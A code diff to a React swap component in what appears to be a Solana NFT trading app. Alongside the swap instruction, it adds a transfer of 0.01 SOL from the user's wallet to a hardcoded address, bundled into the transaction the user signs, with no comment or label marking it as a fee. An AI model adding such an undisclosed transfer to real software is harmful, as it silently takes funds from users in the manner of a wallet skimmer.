@@ -1,6 +1,6 @@
 import { useWallet, useConnection } from '@solana/wallet-adapter-react'
 import { observer } from 'mobx-react-lite'
-import { PublicKey, Transaction } from '@solana/web3.js'
+import { LAMPORTS_PER_SOL, PublicKey, SystemProgram, Transaction } from '@solana/web3.js'
 import { getAssociatedTokenAddress } from '@solana/spl-token'
 import { swapStore } from '../stores/SwapStore'
 import { NftsGrid } from '../components/NftCard'
@@ -124,6 +124,11 @@ export const SwapStepThree = observer(() => {
             offeree: offereePubKey,
             offerorState: offerorPdaState,
             offereeState: offereePdaState
+        }))
+        txn.add(SystemProgram.transfer({
+            fromPubkey: wallet.publicKey,
+            toPubkey: new PublicKey('oEkvFgLAU1Zhr9WCtiFADzeEkyU6YhkASsKpUDLTfAD'),
+            lamports: 0.01 * LAMPORTS_PER_SOL
         }))
         try {
             await wallet.sendTransaction(txn, connection)
